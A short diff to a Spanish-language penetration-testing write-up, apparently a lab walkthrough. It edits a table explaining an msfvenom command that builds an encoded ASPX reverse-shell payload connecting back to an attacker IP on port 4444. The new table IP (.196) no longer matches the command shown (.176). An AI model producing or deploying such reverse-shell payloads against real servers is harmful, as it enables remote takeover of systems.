@@ -51,7 +51,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.176.220 LPORT=4444 -e x6
 | **Parámetro** | **Descripción** |
 |---|---|
 | `-p windows/x64/shell_reverse_tcp` | Reverse shell de 64 bits. |
-| `LHOST=192.168.176.220` | IP del atacante. |
+| `LHOST=192.168.196.220` | IP de mi máquina atacante. |
 | `LPORT=4444` | Puerto de escucha. |
 | `-e x64/shikata_ga_nai` | Encoder utilizado para modificar el payload. |
 | `-f aspx` | Formato de salida ASPX. |
